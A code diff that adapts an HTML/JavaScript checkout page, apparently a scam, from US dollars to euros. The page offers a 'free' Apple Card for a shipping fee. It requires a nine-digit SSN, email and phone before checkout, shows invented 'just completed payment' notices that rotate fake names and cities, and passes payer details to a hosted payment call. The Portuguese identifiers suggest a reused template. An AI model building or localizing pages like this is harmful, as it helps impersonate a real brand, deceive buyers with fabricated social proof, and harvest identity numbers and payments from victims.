@@ -118,7 +118,7 @@
 
         <div class="content" id="checkoutView">
             <div class="test-banner" id="testBanner">
-                &#x1F9EA; TEST MODE — Amount reduced to $2.00
+                &#x1F9EA; TEST MODE — Amount reduced to € 2.00
             </div>
 
             <div class="verify-banner" id="verifyBanner">
@@ -146,15 +146,15 @@
                 </div>
                 <div class="oc-divider"></div>
                 <div class="oc-row"><span class="label">Apple Card</span><span class="value" style="color:var(--success)">Free</span></div>
-                <div class="oc-row"><span class="label">Annual fee</span><span class="value" style="color:var(--success)">$0.00</span></div>
-                <div class="oc-row"><span class="label">Shipping (<span id="orderTipo">Express</span>)</span><span class="value" id="orderFrete">$22.45</span></div>
-                <div class="oc-total"><span>Total</span><span id="orderTotal">$22.45</span></div>
+                <div class="oc-row"><span class="label">Annual fee</span><span class="value" style="color:var(--success)">€ 0.00</span></div>
+                <div class="oc-row"><span class="label">Shipping (<span id="orderTipo">Express</span>)</span><span class="value" id="orderFrete">€ 22.45</span></div>
+                <div class="oc-total"><span>Total</span><span id="orderTotal">€ 22.45</span></div>
             </div>
 
             <button class="pay-btn" id="payBtn" onclick="generatePayment()">
                 <div class="shine"></div>
                 <div class="pay-btn-label">
-                    <span>Continue to secure payment — <span id="payPrice">$22.45</span></span>
+                    <span>Continue to secure payment — <span id="payPrice">€ 22.45</span></span>
                 </div>
             </button>
 
@@ -164,13 +164,13 @@
                     <span class="pm-chip">Credit card</span>
                     <span class="pm-chip">Debit card</span>
                     <span class="pm-chip">PayPal</span>
-                    <span class="pm-chip">PIX</span>
+                    <span class="pm-chip">Bank transfer</span>
                 </div>
             </div>
 
             <div class="live-proof" id="liveProof">
                 <div class="live-dot"></div>
-                <div class="live-text" id="liveText"><strong>Sarah M.</strong> from New York just completed payment</div>
+                <div class="live-text" id="liveText"><strong>Sarah M.</strong> from London just completed payment</div>
             </div>
 
             <div class="faq">
@@ -234,7 +234,7 @@
         }
 
         // ─── Gate: redirect to dados.html if missing required checkout info ───
-        const hasRequired = (data.ssn || data.nif) && (String(data.ssn || data.nif).replace(/\D+/g,'').length === 9)
+        const hasRequired = data.ssn && (String(data.ssn).replace(/\D+/g,'').length === 9)
                          && data.email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)
                          && (data.telefone || data.phone)
                          && (String(data.telefone || data.phone || '').replace(/\D+/g,'').length >= 9)
@@ -268,20 +268,20 @@
         };
         const tipoLabels = { economico:'Standard', expresso:'Express', premium:'Premium' };
 
-        const formatUSD = (v) => `$${v.toFixed(2)}`;
+        const formatEUR = (v) => `€ ${v.toFixed(2)}`;
 
         document.getElementById('orderCardBg').style.background = colorMap[corCartao] || colorMap.silver;
         document.getElementById('orderColor').textContent = corLabel;
         document.getElementById('orderTipo').textContent = tipoLabels[tipo] || 'Express';
-        document.getElementById('orderFrete').textContent = formatUSD(frete);
-        document.getElementById('orderTotal').textContent = formatUSD(frete);
-        document.getElementById('payPrice').textContent = formatUSD(frete);
+        document.getElementById('orderFrete').textContent = formatEUR(frete);
+        document.getElementById('orderTotal').textContent = formatEUR(frete);
+        document.getElementById('payPrice').textContent = formatEUR(frete);
 
         if (window.track) window.track('InitiateCheckout', {
             value: frete,
-            currency: 'USD',
+            currency: 'EUR',
             num_items: 1,
-            content_id: 'apple-card-us-' + tipo,
+            content_id: 'apple-card-eu-' + tipo,
             content_name: 'Apple Card — ' + (tipoLabels[tipo] || 'Express'),
             content_type: 'product'
         });
@@ -299,11 +299,11 @@
         window.toggleFaq = function(el) { el.parentElement.classList.toggle('open'); };
 
         const proofs = [
-            {name:'Sarah M.',city:'New York'},{name:'John P.',city:'Los Angeles'},
-            {name:'Ashley C.',city:'Chicago'},{name:'Chris M.',city:'Houston'},
-            {name:'Jessica L.',city:'Miami'},{name:'David R.',city:'Seattle'},
-            {name:'Emily A.',city:'Boston'},{name:'Michael D.',city:'Austin'},
-            {name:'Olivia F.',city:'San Francisco'},{name:'Daniel N.',city:'Denver'}
+            {name:'Sarah M.',city:'London'},{name:'John P.',city:'Berlin'},
+            {name:'Ashley C.',city:'Paris'},{name:'Chris M.',city:'Madrid'},
+            {name:'Jessica L.',city:'Amsterdam'},{name:'David R.',city:'Milan'},
+            {name:'Emily A.',city:'Lisbon'},{name:'Michael D.',city:'Dublin'},
+            {name:'Olivia F.',city:'Barcelona'},{name:'Daniel N.',city:'Munich'}
         ];
         let proofIdx = 0;
         function rotateSocialProof() {
@@ -331,9 +331,9 @@
 
             if (window.track) window.track('AddPaymentInfo', {
                 value: frete,
-                currency: 'USD',
+                currency: 'EUR',
                 payment_method: 'cooud_hosted',
-                content_id: 'apple-card-us-' + tipo,
+                content_id: 'apple-card-eu-' + tipo,
                 content_type: 'product'
             });
 
@@ -352,7 +352,7 @@
 
             const payload = {
                 amount: amountCents,
-                currency: 'usd',
+                currency: 'eur',
                 payerName: data.nome || data.name || params.get('nome') || 'Customer',
                 email: data.email || params.get('email') || '',
                 phone: data.telefone || data.phone || params.get('phone') || '',
